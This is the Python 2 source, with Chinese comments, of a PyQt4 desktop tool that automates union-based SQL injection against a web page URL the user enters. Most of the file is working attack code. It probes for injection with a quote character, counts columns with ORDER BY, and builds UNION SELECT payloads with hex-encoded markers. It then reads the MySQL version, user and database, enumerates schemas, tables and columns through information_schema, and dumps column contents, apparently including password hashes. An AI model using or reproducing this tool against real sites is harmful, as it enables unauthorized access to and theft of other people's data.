#-*coding:utf8-*-
import sys
from PyQt4 import QtCore, QtGui, uic
import re
import urllib2
 
qtCreatorFile = "sql.ui" # Enter file here.这是你自己创建的UI文件地址
 
Ui_MainWindow, QtBaseClass = uic.loadUiType(qtCreatorFile)
 
class MyApp(QtGui.QMainWindow, Ui_MainWindow):

    def __init__(self):
        QtGui.QMainWindow.__init__(self)
        Ui_MainWindow.__init__(self)
        self.setupUi(self)       
        self.url_test.clicked.connect(self.url)
        self.version_button.clicked.connect(self.version)
        self.dbs_button.clicked.connect(self.dbs)
        self.table_button.clicked.connect(self.select_table)
        self.column_button.clicked.connect(self.column)
        self.dump_button.clicked.connect(self.dump)

    def column(self):
		connect = self.url_payload
		htmlSix = urllib2.Request(connect)
		database_name = str(self.database_name.toPlainText())
		table_name = str(self.table_name.toPlainText())
		UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
		htmlSix.add_header("header",UserAgent)
		htmlSix = urllib2.urlopen(htmlSix)
		htmlSixText = htmlSix.read()
		htmlSixText = str(htmlSixText)
		re_ns = r'<zz>(.*?)</zz>'
		for g in range(0,self.n):
		    re_n = re.findall(re_ns,htmlSixText,re.S|re.M)
		n = "<zz>" + str(re_n[2]) + "</zz>"
		if n in htmlSixText:
		    mb = "".join("{:02x}".format(ord(c)) for c in n)
		    j = "0x" + mb
		    start = "<zz>"
		    starte = "".join("{:02x}".format(ord(c)) for c in start)
		    starty = "0x" + starte
		    end = "</zz>"
		    ende = "".join("{:02x}".format(ord(c)) for c in end)
		    endy = "0x" + ende
		    database = "group_concat(" + starty + ",column_name,"+endy + ")"
		    connect = connect.replace(j,database)
		    print connect
		    connect =  connect[:-2] + "+from+information_schema.columns+where+table_schema=%27"+database_name+"%27+and+table_name=%27"+table_name+"%27"+"--+"
		    print connect
		    htmlSix = urllib2.Request(connect)
		    htmlSix.add_header("UserAgent",UserAgent)
		    htmlSix = urllib2.urlopen(htmlSix)
		    htmlSixText = htmlSix.read()
		    res_str = r'<zz>(.*?)</zz>'
		    m_tr = re.findall(res_str,htmlSixText,re.S|re.M)
		    m_tr = list(set(m_tr))
		    m_tr.remove('2')
		    self.result_text.setText(u"当前数据库为："+unicode(database_name))
		    self.result_text.append(unicode(table_name)+u"中字段数量为:"+str(len(m_tr)))
		    i=0
		    for i in range(len(m_tr)):
			    self.result_text.append(u"【*】"+m_tr[i])

    
    def dump(self):
		column_name = str(self.column_name.toPlainText())
		len_col = len(column_name)
		connect = self.url_payload
		htmlSix = urllib2.Request(connect)
		database_name = str(self.database_name.toPlainText())
		table_name = str(self.table_name.toPlainText())
		UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
		htmlSix.add_header("header",UserAgent)
		htmlSix = urllib2.urlopen(htmlSix)
		htmlSixText = htmlSix.read()
		htmlSixText = str(htmlSixText)
		re_ns = r'<zz>(.*?)</zz>'
		for g in range(0,self.n):
		    re_n = re.findall(re_ns,htmlSixText,re.S|re.M)
		n = "<zz>" + str(re_n[2]) + "</zz>"
		if n in htmlSixText:
		    mb = "".join("{:02x}".format(ord(c)) for c in n)
		    j = "0x" + mb
		    start = "<zz>"
		    starte = "".join("{:02x}".format(ord(c)) for c in start)
		    starty = "0x" + starte
		    end = "</zz>"
		    ende = "".join("{:02x}".format(ord(c)) for c in end)
		    endy = "0x" + ende
		    database = "group_concat(" + starty + ","+column_name+","+endy + ")"
		    connect = connect.replace(j,database)
		    connect =  connect[:-2] + "+from+"+database_name+"."+table_name+"--+"
		    print connect

		    htmlSix = urllib2.Request(connect)
		    htmlSix.add_header("UserAgent",UserAgent)
		    htmlSix = urllib2.urlopen(htmlSix)
		    htmlSixText = htmlSix.read()
		    res_str = r'<zz>(.*?)</zz>'
		    m_tr = re.findall(res_str,htmlSixText,re.S|re.M)
		    m_tr = list(set(m_tr))
		    m_tr.remove('2')
		    result = []

		    self.result_text.setText(u"当前数据库为："+unicode(database_name))
		    self.result_text.append(unicode(table_name)+u"表中"+unicode(str(column_name))+u"字段内容为:"+str(len(m_tr)))
		    i=0
		    for i in range(len(m_tr)):
			    self.result_text.append(u"【*】"+m_tr[i][:-32]+","+m_tr[i][-32:])


    def select_table(self):
        if(self.database_name.toPlainText()):
			connect = self.url_payload
			database_name = str(self.database_name.toPlainText())
			print database_name
			htmlSix = urllib2.Request(connect)
			UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
			htmlSix.add_header("header",UserAgent)
			htmlSix = urllib2.urlopen(htmlSix)
			htmlSixText = htmlSix.read()
			htmlSixText = str(htmlSixText)
			re_ns = r'<zz>(.*?)</zz>'
			for g in range(0,14):
				re_n = re.findall(re_ns,htmlSixText,re.S|re.M)
			n = "<zz>" + str(re_n[2]) + "</zz>"
			if n in htmlSixText:
				mb = "".join("{:02x}".format(ord(c)) for c in n)
				j = "0x" + mb
				start = "<zz>"
				starte = "".join("{:02x}".format(ord(c)) for c in start)
				starty = "0x" + starte
				end = "</zz>"
				ende = "".join("{:02x}".format(ord(c)) for c in end)
				endy = "0x" + ende
				database = "group_concat(" + starty + ",table_name,"+endy + ")"
				connect = connect.replace(j,database)

				connect =  connect[:-2] + "+from+information_schema.tables+where+table_schema=%27"+database_name+"%27"+"--+"
				print connect
				htmlSix = urllib2.Request(connect)
				htmlSix.add_header("UserAgent",UserAgent)
				htmlSix = urllib2.urlopen(htmlSix)
				htmlSixText = htmlSix.read()
				res_str = r'<zz>(.*?)</zz>'
				m_tr = re.findall(res_str,htmlSixText,re.S|re.M)
				# f = open("html1.html","w")
				# f.write(htmlSixText)
				# f.close()
				m_tr = list(set(m_tr))
				m_tr.remove('2')
				self.result_text.setText(u"当前数据库为："+unicode(database_name))
				self.result_text.append(unicode(database_name)+u"中表数量为:"+str(len(m_tr)))
				i=0
				
				for i in range(len(m_tr)):
					self.result_text.append(u"【*】"+m_tr[i])
        else:
            self.result_text.setText(u"请输入数据库名")
    
	

    
    def dbs(self):
		htmlFive = urllib2.Request(self.url_payload)
		UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
		htmlFive.add_header("header",UserAgent)
		htmlFive = urllib2.urlopen(htmlFive)
		htmlFiveText = htmlFive.read()
		htmlFiveText = str(htmlFiveText)
		re_ns = r'<zz>(.*?)</zz>'
		for g in range(1,self.n):
			re_n = re.findall(re_ns,htmlFiveText,re.S|re.M)
		n = "<zz>" + str(re_n[0]) + "</zz>"
		if n in htmlFiveText:
			mb = "".join("{:02x}".format(ord(c)) for c in n)
			j = "0x" + mb
			start = "<zz>"
			starte = "".join("{:02x}".format(ord(c)) for c in start)
			starty = "0x" + starte
			end = "</zz>"
			ende = "".join("{:02x}".format(ord(c)) for c in end)
			endy = "0x" + ende
			database = "group_concat(" + starty + ",schema_name,"+endy + ")"
			connect = self.url_payload.replace(j,database)

			connect =  connect[:-2] + "+from+information_schema.schemata+"+"--"
			htmlFive = urllib2.Request(connect)
			htmlFive.add_header("UserAgent",UserAgent)
			htmlFive = urllib2.urlopen(htmlFive)
			htmlFiveText = htmlFive.read()
			res_str = r'<zz>(.*?)</zz>'
			m_tr = re.findall(res_str,htmlFiveText,re.S|re.M)
			m_tr.pop()
			m_tr = list(set(m_tr))
			self.result_text.setText(u"当前用户权限可查看数据库数量为:"+str(len(m_tr)))
			self.result_text.append(u"数据库为：")
			i=0
			for i in range(len(m_tr)):
				self.result_text.append(u"【*】"+m_tr[i])
		else:
			print "Error"
    
    def version(self):
		htmlFour = urllib2.Request(self.url_payload)
		UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
		htmlFour.add_header("header",UserAgent)
		htmlFour = urllib2.urlopen(htmlFour)
		htmlFourText = htmlFour.read()
		htmlFourText = str(htmlFourText)
		re_ns = r'<zz>(.*?)</zz>'
		print "Test"
		for g in range(1,self.n):
			re_n = re.findall(re_ns,htmlFourText,re.S|re.M)
		n = "<zz>" + str(re_n[0]) + "</zz>"
		if n in htmlFourText:
			mb = "".join("{:02x}".format(ord(c)) for c in n)
			j = "0x" + mb
			start = "<zz>"
			starte = "".join("{:02x}".format(ord(c)) for c in start)
			starty = "0x" + starte
			end = "</zz>"
			ende = "".join("{:02x}".format(ord(c)) for c in end)
			endy = "0x" + ende
			version = "group_concat(" + starty + ",version(),"+endy +","+starty+",database(),"+endy+","+starty + ",user()," + endy + ")"
			connect = self.url_payload.replace(j,version)
			htmlFive = urllib2.Request(connect)
			htmlFive.add_header("UserAgent",UserAgent)
			htmlFive = urllib2.urlopen(htmlFive)
			htmlFiveText = htmlFive.read()
			res_str = r'<zz>(.*?)</zz>'
			m_tr = re.findall(res_str,htmlFiveText,re.S|re.M)
			self.result_text.setText(u"【*】当前数据库版本为：Mysql:"+m_tr[0])
			self.result_text.append(u"【*】当前数据库用户为："+m_tr[2])
			self.result_text.append(u"【*】当前正在使用的数据库为："+m_tr[1])
		else:
			print "Error"
    def url(self):
		link = str(self.url_box.toPlainText())
		link=link.strip('\n')
		print link
		htmlOne = urllib2.Request(link)
		UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
		htmlOne.add_header("UserAgent",UserAgent)
		htmlOne = urllib2.urlopen(htmlOne)
		htmlOneText =htmlOne.read()
		htmlOneText = str(htmlOneText)
		t = "%27"
		test = link + t
		htmlTwo = urllib2.Request(test)
		htmlTwo.add_header("UserAgent",UserAgent)
		htmlTwo = urllib2.urlopen(htmlTwo)
		htmlTwoText = htmlTwo.read()
		htmlTwoText = str(htmlTwoText)
		if htmlOneText == htmlTwoText:
			self.result_text.setText(u"不存在注入")
			
		else:
			self.result_text.setText(u"存在注入，\n进行order by 查询")
			n = 1
			ordering = "+order+by+"
			end = '--+'
			x = True
			while x:
				order1 = link + ordering + str(n) + end
				htmlThree = urllib2.Request(order1)
				htmlThree.add_header("UserAgent",UserAgent)
				htmlThree = urllib2.urlopen(htmlThree)
				htmlThreeText = str(htmlThree.read())
				
				if htmlThreeText == htmlOneText:	
					n = n + 1
				elif htmlThreeText != htmlOneText:
					n = n - 1
					x = False
			self.result_text.append(u"一共有"+str(n)+u"个字段")
		union = "+union+select+"
		connect = link + union 
		k = ","
		for g in range(1,n+1):
			mb = "<zz>" + str(g) +"</zz>"
			mb = "".join("{:02x}".format(ord(c)) for c in mb)
			mbn = "0x" + mb
			connect = connect + mbn +k
		connect = connect[:-1]
		connect = connect.replace("=","=-")
		connect = connect + '--'
		self.url_payload = connect
		self.n = n
		print self.url_payload



 
if __name__ == "__main__":
	app = QtGui.QApplication(sys.argv)
	window = MyApp()
	window.show()
	sys.exit(app.exec_())